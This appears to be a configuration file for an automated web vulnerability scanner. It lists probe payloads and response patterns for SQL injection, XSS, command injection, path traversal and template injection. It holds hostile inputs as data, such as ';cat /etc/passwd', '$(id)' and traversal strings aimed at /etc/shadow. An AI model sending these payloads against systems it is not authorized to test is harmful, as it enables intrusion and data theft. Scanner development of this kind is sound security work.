// data/hybrid-checks.js — Deterministic vulnerability checks for hybrid mode
// Each check sends payloads and pattern-matches responses.
// Candidate hits are passed to the LLM judge for binary classification.

window.VOID_HYBRID_CHECKS = {

  sqli: {
    id: 'sqli',
    name: 'SQL Injection (Error-based)',
    description: 'Detect SQL injection via database error strings in responses',
    riskIfFound: 'high',
    injectIn: 'param',
    method: 'GET',
    payloads: [
      "'", "''", "1'", "1\"", "1' OR '1'='1", "1' AND '1'='2", "1; --",
      "1' UNION SELECT NULL--", "1' ORDER BY 1--", "1' ORDER BY 100--",
      "1 AND 1=1", "1 AND 1=2", "') OR ('1'='1",
    ],
    patterns: [
      /SQL syntax.*MySQL/i,
      /Warning.*mysql_/i,
      /MySQLSyntaxErrorException/i,
      /valid MySQL result/i,
      /check the manual that corresponds to your (MySQL|MariaDB)/i,
      /Unknown column '[^']+' in/i,
      /com\.mysql\.jdbc/i,
      /Unclosed quotation mark/i,
      /quoted string not properly terminated/i,
      /ORA-\d{5}/i,
      /Oracle.*Driver/i,
      /oracle\.jdbc/i,
      /Microsoft OLE DB Provider for SQL Server/i,
      /\[Microsoft\]\[ODBC SQL Server Driver\]/i,
      /SqlException/i,
      /SQLServer JDBC Driver/i,
      /mssql_query/i,
      /PG::SyntaxError/i,
      /PSQLException/i,
      /pg_query/i,
      /pg_exec/i,
      /unterminated quoted string at or near/i,
      /SQLite3::SQLException/i,
      /SQLITE_ERROR/i,
      /unrecognized token/i,
      /near ".*": syntax error/i,
      /SQL error.*message.*\[/i,
      /You have an error in your SQL syntax/i,
    ],
  },

  sqli_blind: {
    id: 'sqli_blind',
    name: 'SQL Injection (Blind Boolean)',
    description: 'Detect blind SQLi by comparing response differences between true/false conditions',
    riskIfFound: 'high',
    injectIn: 'param',
    method: 'GET',
    // Pairs: [true_condition, false_condition] — if response differs significantly, likely SQLi
    payloads: [
      "1 AND 1=1", "1 AND 1=2",
      "1' AND '1'='1", "1' AND '1'='2",
      "1') AND ('1'='1", "1') AND ('1'='2",
    ],
    // No regex patterns — blind detection compares response lengths/content
    patterns: [],
    blind: true,
  },

  xss_reflected: {
    id: 'xss_reflected',
    name: 'Reflected XSS',
    description: 'Detect reflected XSS by checking if payloads appear unencoded in response',
    riskIfFound: 'medium',
    injectIn: 'param',
    method: 'GET',
    payloads: [
      '<script>alert(1)</script>',
      '"><script>alert(1)</script>',
      "'-alert(1)-'",
      '<img src=x onerror=alert(1)>',
      '"><img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      '<body onload=alert(1)>',
      'javascript:alert(1)',
      '<details open ontoggle=alert(1)>',
      '${7*7}',
    ],
    patterns: [
      // Check if the EXACT payload appears in the response (reflection)
      // These are checked dynamically — see the check runner
    ],
    reflection: true, // special mode: check if payload appears in response body
  },

  xss_stored: {
    id: 'xss_stored',
    name: 'Stored XSS',
    description: 'Detect stored XSS by submitting payloads and checking if they persist on re-fetch',
    riskIfFound: 'high',
    injectIn: 'body',
    method: 'POST',
    payloads: [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
    ],
    patterns: [],
    stored: true, // special mode: submit then re-fetch the page to check persistence
  },

  xss_dom: {
    id: 'xss_dom',
    name: 'DOM-based XSS',
    description: 'Detect DOM XSS by checking for dangerous source-to-sink flows in page JavaScript',
    riskIfFound: 'medium',
    injectIn: 'param',
    method: 'GET',
    payloads: [
      '#<img src=x onerror=alert(1)>',
      '?q=<script>alert(1)</script>',
    ],
    patterns: [
      /document\.write\s*\(/i,
      /\.innerHTML\s*=/i,
      /eval\s*\(/i,
      /location\.hash/i,
      /location\.search/i,
      /document\.URL/i,
      /document\.referrer/i,
      /window\.name/i,
    ],
    domCheck: true, // check in page JS sources, not in HTTP response body
  },

  cmdi: {
    id: 'cmdi',
    name: 'Command Injection',
    description: 'Detect OS command injection via output patterns or timing',
    riskIfFound: 'critical',
    injectIn: 'param',
    method: 'GET',
    payloads: [
      ';id', '|id', '`id`', '$(id)',
      ';cat /etc/passwd', '|cat /etc/passwd',
      '& whoami', '| whoami',
      ';uname -a', '$(uname -a)',
      '| dir', '& dir',
      ';sleep 5', '|sleep 5', '$(sleep 5)',
      '& ping -c 1 127.0.0.1', '| ping -n 1 127.0.0.1',
    ],
    patterns: [
      /uid=\d+\(\w+\)/i,
      /root:.*:0:0:/,
      /\bLinux\b.*\b\d+\.\d+\.\d+/,
      /\bDarwin\b/,
      /bin\/(bash|sh|zsh)/,
      /Volume Serial Number/i,
      /Windows IP Configuration/i,
      /Directory of [A-Z]:\\/i,
      /\d+ packets transmitted/i,
      /Pinging.*with \d+ bytes/i,
    ],
  },

  lfi: {
    id: 'lfi',
    name: 'Local File Inclusion / Path Traversal',
    description: 'Detect LFI by requesting known system files via directory traversal',
    riskIfFound: 'high',
    injectIn: 'param',
    method: 'GET',
    payloads: [
      '../../../../etc/passwd',
      '....//....//....//....//etc/passwd',
      '..%2f..%2f..%2f..%2fetc%2fpasswd',
      '..%252f..%252f..%252f..%252fetc%252fpasswd',
      '/etc/passwd',
      '../../../../windows/win.ini',
      '..\\..\\..\\..\\windows\\win.ini',
      '../../../../etc/shadow',
      'file:///etc/passwd',
      '....//....//....//....//etc/hosts',
      '%00',
      'php://filter/convert.base64-encode/resource=index',
    ],
    patterns: [
      /root:.*:0:0:/,
      /daemon:.*:1:1:/,
      /\[fonts\]/i,         // win.ini
      /\[extensions\]/i,    // win.ini
      /localhost/,          // /etc/hosts
      /127\.0\.0\.1/,
      /\$shadow/i,
    ],
  },

  ssti: {
    id: 'ssti',
    name: 'Server-Side Template Injection',
    description: 'Detect SSTI by checking if math expressions are evaluated in template engines',
    riskIfFound: 'critical',
    injectIn: 'param',
    method: 'GET',
    payloads: [
      '{{7*7}}',
      '${7*7}',
      '<%= 7*7 %>',
      '#{7*7}',
      "{{7*'7'}}",
      '{{config}}',
      '{{self}}',
      '${T(java.lang.Runtime).getRuntime()}',
      '{php}echo 7*7;{/php}',
      '#set($x=7*7)$x',
      '{{constructor.constructor("return 7*7")()}}',
    ],
    patterns: [
      /\b49\b/,             // 7*7 = 49
      /\b7777777\b/,        // 7*'7' in Jinja2
      /SECRET_KEY/i,        // {{config}} leak
      /TemplateData/i,      // {{self}} leak
      /java\.lang\.Runtime/i,
      /java\.lang\.ProcessBuilder/i,
    ],
  },

};
